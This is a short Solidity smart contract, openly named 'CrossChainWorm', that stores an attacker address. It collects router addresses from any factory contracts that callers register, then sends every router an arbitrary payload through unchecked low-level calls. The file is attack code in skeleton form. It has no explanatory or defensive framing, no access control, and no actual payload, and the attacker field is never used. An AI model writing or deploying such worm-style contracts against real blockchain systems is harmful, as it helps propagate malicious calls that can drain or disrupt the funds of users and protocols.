// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

interface IRouterFactory {
    function getRouters() external view returns (address[] memory);
}

contract CrossChainWorm {
    address public attacker;
    address[] public factories;

    constructor(address _attacker) {
        attacker = _attacker;
    }

    function addFactory(address factory) external {
        factories.push(factory);
    }

    function spreadCrossChain(bytes calldata payload) external {
        for (uint256 f = 0; f < factories.length; f++) {
            address[] memory routers = IRouterFactory(factories[f]).getRouters();
            for (uint256 i = 0; i < routers.length; i++) {
                routers[i].call(payload);
            }
        }
    }
}
